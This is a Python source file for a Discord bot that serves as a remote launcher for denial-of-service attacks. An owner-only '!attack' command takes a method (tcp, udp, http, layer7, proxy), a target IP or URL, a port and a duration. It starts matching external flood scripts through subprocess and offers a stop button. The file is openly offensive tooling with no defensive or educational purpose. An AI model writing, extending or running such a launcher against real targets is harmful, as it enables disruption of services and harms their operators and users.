import discord
from discord.ext import commands
from discord.ui import Button, View
import subprocess
import threading

OWNER_ID = 898663928308060180

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

attack_process = None
attack_lock = threading.Lock()

def run_attack_process(args):
    global attack_process
    with attack_lock:
        if attack_process and attack_process.poll() is None:
            return False
        attack_process = subprocess.Popen(args)
        return True

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")

@bot.command()
async def attack(ctx, method: str, target: str, port: int = None, duration: int = None):
    if ctx.author.id != OWNER_ID:
        return await ctx.send("Unauthorized.")

    method = method.lower()
    args = []

    if method == "tcp":
        if not all([port, duration]):
            return await ctx.send("Usage: !attack tcp <ip> <port> <duration>")
        args = ["python3", "tcp_attack.py", target, str(port), str(duration)]

    elif method == "udp":
        if not all([port, duration]):
            return await ctx.send("Usage: !attack udp <ip> <port> <duration>")
        args = ["python3", "udp_attack.py", target, str(port), str(duration)]

    elif method == "http":
        if not duration:
            return await ctx.send("Usage: !attack http <url> <duration>")
        args = ["python3", "http_attack.py", target, str(duration)]

    elif method == "layer7":
        if not duration:
            return await ctx.send("Usage: !attack layer7 <url> <duration>")
        args = ["python3", "layer7_attack.py", target, str(duration)]

    elif method == "proxy":
        if not duration:
            return await ctx.send("Usage: !attack proxy <url> <duration>")
        args = ["python3", "proxy_attack.py", target, str(duration)]

    else:
        return await ctx.send("Unknown method. Available: tcp, udp, http, layer7, proxy")

    started = run_attack_process(args)
    if not started:
        return await ctx.send("Attack already running. Stop it first.")

    desc = f"Method: `{method}`\nTarget: `{target}`\n"
    if port: desc += f"Port: `{port}`\n"
    desc += f"Duration: `{duration}`s"

    embed = discord.Embed(title="🚀 Attack Launched", description=desc, color=0x00ff00)
    await ctx.send(embed=embed)

    stop_button = Button(label="🛑 Stop Attack", style=discord.ButtonStyle.danger)

    async def stop_callback(interaction):
        if interaction.user.id != OWNER_ID:
            return await interaction.response.send_message("Unauthorized", ephemeral=True)
        with attack_lock:
            if attack_process:
                attack_process.kill()
        await interaction.response.edit_message(embed=discord.Embed(title="🛑 Attack Stopped", color=0xff0000), view=None)

    stop_button.callback = stop_callback
    view = View()
    view.add_item(stop_button)

    await ctx.send(view=view)

if __name__ == "__main__":
    token = input("Enter your bot token: ")
    bot.run(token)
